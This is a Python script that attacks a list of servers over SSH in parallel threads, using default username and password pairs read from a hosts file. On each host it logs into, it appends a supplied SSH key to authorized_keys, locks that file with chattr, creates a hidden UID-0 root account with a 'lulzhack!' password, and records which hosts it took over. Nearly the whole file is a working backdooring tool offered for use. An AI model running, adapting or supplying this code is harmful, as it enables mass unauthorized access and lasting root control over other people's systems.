import os
import sys
import paramiko
import time
import traceback
import select
import threading

port = 22
username1 = "<default username>"
password1 = "<default password>"
username2 = "<default username>"
password2 = "<default password>"
key = 'ssh-rsa <enter your key here>'
outlock = threading.Lock()

def workon(host):
    try:
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print ("Connecting to %s" % host)
        ssh.connect(host, port, username1, password1)
        stdin, stdout, stderr = ssh.exec_command("sudo echo '%s' >> ~/.ssh/authorized_keys \n sudo chattr +i ~/.ssh/authorized_keys \n sudo useradd -ou 0 -g 0 <Enter Username> \n sudo echo 'lulzhack!' | passwd <Enter Password> --stdin" % key)
        with outlock:
            print ("Connected to %s" % host)
            os.system('echo "%s" >> successful' % host)
            print (stdout.readlines())
            sys.exit()
        sys.exit()
    except paramiko.AuthenticationException:
        print ("Authentication failed when connecting to host %s" %(host))
        print ("Trying again for %s" % host)
        try:
            ssh.connect(host, port, username2, password2)
            with outlock:
                print ("Connected to %s" % host)
                os.system('echo "%s" >> successful' % host)
                print (stdout.readlines())
                sys.exit()
            sys.exit()
        except paramiko.AuthenticationException:
            print ("Final try to %s failed" % host)
            os.system('echo "%s" >> failed' % host)
            sys.exit()
        except Exception:
            pass
            sys.exit()
    except Exception:
        print ("Port not opened or unreachable for %s" % host)
        os.system('echo "%s" >> failed' % host)
        pass
        sys.exit()
def main():
    threads = []
    for h in open ('serveripaddr.txt'):
        h = h.rstrip()
        t = threading.Thread(target=workon, args=(h,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
